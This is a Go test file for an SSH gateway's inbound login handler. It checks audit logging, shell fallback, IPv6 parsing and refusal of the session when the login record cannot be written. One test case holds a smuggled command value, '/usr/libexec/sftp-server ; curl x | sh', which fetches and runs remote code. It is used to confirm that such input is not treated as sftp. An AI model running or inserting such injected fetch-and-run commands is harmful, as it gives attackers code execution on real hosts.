package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

type inboundRun struct {
	store, shell string
	argv         []string
	execed       bool
}

func (r *inboundRun) exec(p string, argv, _ []string) error {
	r.execed, r.shell, r.argv = true, p, argv
	return nil
}

func runInboundWith(t *testing.T, env map[string]string) (*inboundRun, string, error) {
	t.Helper()
	r := &inboundRun{store: filepath.Join(t.TempDir(), "servers.json")}
	env["SSHGATE_STORE"] = r.store
	err := inbound("iphone", func(k string) string { return env[k] }, nil, r.exec)
	b, _ := os.ReadFile(filepath.Join(filepath.Dir(r.store), "audit.jsonl"))
	return r, string(b), err
}

func TestInboundRecordsAndExecs(t *testing.T) {
	for name, tc := range map[string]struct {
		env     map[string]string
		session string
		tty     string
		argv    []string
	}{
		"shell":    {map[string]string{"SSH_TTY": "/dev/ttys001"}, "shell", "true", []string{"/bin/zsh", "-l"}},
		"command":  {map[string]string{"SSH_ORIGINAL_COMMAND": "echo 'secret-token' && ls"}, "command", "false", []string{"/bin/zsh", "-c", "echo 'secret-token' && ls"}},
		"sftp":     {map[string]string{"SSH_ORIGINAL_COMMAND": "/usr/libexec/sftp-server"}, "sftp", "false", []string{"/bin/zsh", "-c", "/usr/libexec/sftp-server"}},
		"inject":   {map[string]string{"SSH_ORIGINAL_COMMAND": "/usr/libexec/sftp-server ; curl x | sh"}, "command", "false", []string{"/bin/zsh", "-c", "/usr/libexec/sftp-server ; curl x | sh"}},
		"internal": {map[string]string{"SSH_ORIGINAL_COMMAND": "internal-sftp"}, "sftp", "false", []string{"/bin/zsh", "-c", "internal-sftp"}},
	} {
		t.Run(name, func(t *testing.T) {
			tc.env["SSH_CONNECTION"] = "100.64.0.5 51234 100.64.0.1 22"
			tc.env["SHELL"] = "/bin/zsh"
			r, log, err := runInboundWith(t, tc.env)
			if err != nil || !r.execed || r.shell != "/bin/zsh" || !slices.Equal(r.argv, tc.argv) {
				t.Fatalf("err %v run %+v", err, r)
			}
			for _, w := range []string{`"kind":"login"`, `"device":"iphone"`, `"from":"100.64.0.5:51234"`, `"session":"` + tc.session + `"`, `"tty":` + tc.tty} {
				if !strings.Contains(log, w) {
					t.Errorf("record lacks %s: %s", w, log)
				}
			}
			if strings.Contains(log, "secret-token") || strings.Count(log, "\n") != 1 {
				t.Fatalf("the command text is recorded, or not one line: %q", log)
			}
		})
	}
}

func TestInboundShellFallsBackToSh(t *testing.T) {
	r, _, err := runInboundWith(t, map[string]string{"SSH_CONNECTION": "::1 5 ::1 22", "SHELL": "zsh"})
	if err != nil || r.shell != "/bin/sh" {
		t.Fatalf("%v %+v", err, r)
	}
}

func TestInboundIPv6From(t *testing.T) {
	_, log, err := runInboundWith(t, map[string]string{"SSH_CONNECTION": "fd7a:115c::1 5 fd7a:115c::2 22"})
	if err != nil || !strings.Contains(log, `"from":"[fd7a:115c::1]:5"`) {
		t.Fatalf("%v %s", err, log)
	}
}

func TestInboundRefusesWithoutSSHConnection(t *testing.T) {
	for _, c := range []string{"", "1.2.3.4 5", "not-an-ip 5 1.2.3.4 22"} {
		r, log, err := runInboundWith(t, map[string]string{"SSH_CONNECTION": c, "SSH_ORIGINAL_COMMAND": "id"})
		if err == nil || r.execed || log != "" {
			t.Errorf("%q: err %v execed %v log %q", c, err, r.execed, log)
		}
	}
}

func TestInboundNoSessionWhenRecordFails(t *testing.T) {
	dir := t.TempDir()
	// The audit path is a folder: the append fails.
	if err := os.Mkdir(filepath.Join(dir, "audit.jsonl"), 0o700); err != nil {
		t.Fatal(err)
	}
	env := map[string]string{"SSH_CONNECTION": "1.2.3.4 5 1.2.3.5 22", "SSHGATE_STORE": filepath.Join(dir, "servers.json"), "SSH_ORIGINAL_COMMAND": "id"}
	r := &inboundRun{}
	err := inbound("iphone", func(k string) string { return env[k] }, nil, r.exec)
	if err == nil || err.Error() != "could not record this login" || r.execed {
		t.Fatalf("err %v execed %v", err, r.execed)
	}
	// And a missing folder.
	env["SSHGATE_STORE"] = filepath.Join(dir, "nope", "servers.json")
	if err := inbound("iphone", func(k string) string { return env[k] }, nil, r.exec); err == nil || r.execed {
		t.Fatalf("missing folder: err %v execed %v", err, r.execed)
	}
}

func TestInboundBadName(t *testing.T) {
	r := &inboundRun{}
	if err := inbound(`a"b`, func(string) string { return "1.2.3.4 5 1.2.3.5 22" }, nil, r.exec); err == nil || r.execed {
		t.Fatal("bad name ran")
	}
}

func TestInboundEndsATornLine(t *testing.T) {
	dir := t.TempDir()
	audit := filepath.Join(dir, "audit.jsonl")
	if err := os.WriteFile(audit, []byte(`{"kind":"login","dev`), 0o600); err != nil {
		t.Fatal(err)
	}
	env := map[string]string{"SSH_CONNECTION": "1.2.3.4 5 1.2.3.5 22", "SSHGATE_STORE": filepath.Join(dir, "servers.json"), "SSH_ORIGINAL_COMMAND": "id"}
	if err := inbound("iphone", func(k string) string { return env[k] }, nil, (&inboundRun{}).exec); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(audit)
	lines := strings.Split(strings.TrimSuffix(string(b), "\n"), "\n")
	if len(lines) != 2 || !json.Valid([]byte(lines[1])) {
		t.Fatalf("the record is not on its own line: %q", b)
	}
}
